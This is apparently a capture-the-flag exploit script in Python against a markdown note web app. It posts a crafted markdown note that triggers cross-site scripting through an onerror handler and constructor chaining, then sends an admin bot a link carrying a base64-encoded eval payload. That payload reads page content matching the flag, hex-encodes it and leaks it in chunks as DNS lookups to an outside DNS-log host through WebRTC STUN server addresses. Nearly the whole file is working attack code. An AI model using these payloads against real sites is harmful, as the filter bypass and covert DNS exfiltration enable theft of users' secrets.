import requests
import re
import base64


url = "http://10.99.210.103:8024/"
dnslog_server = "u9lh0wo.q.dnsl0g.net"
# https://dnsl0g.net/

s = requests.Session()
s.post(
    url,
    data={
        "note": "![ouo[](2)](onerror=a=`'`+location;[]['constructor']['constructor']`_${a}```  src=x))"
    },
)

exp_note_id = re.findall(r'href="/note/(.*?)"', s.get(url).text)[0]

payload = f"fetch('/').then(res => res.text()).then(res => {{ const chunks = (s => {{ let hex = '', match = s.match('CGGC.*')[0]; for (let i = 0; i < match.length; i++) hex += match.charCodeAt(i).toString(16).padStart(2, '0'); return [...Array(Math.ceil(hex.length / 32))].map((_, i) => hex.slice(i * 32, i * 32 + 32)); }})(res); chunks.forEach(chunk => {{const stunServer = `stun:${{chunk}}.{dnslog_server}`; console.log(stunServer); const pc = new RTCPeerConnection({{iceServers: [{{'urls': stunServer}}]}}); pc.createDataChannel('d'); pc.setLocalDescription();}}); }});"
payload = f"#';eval(atob('{base64.b64encode(payload.encode()).decode()}'))"
payload = "http://markdown/note/" + exp_note_id + payload
print(payload)

s.post(
    url + "report",
    data={
        "url": payload,
    },
)

# you will get flag in dns log
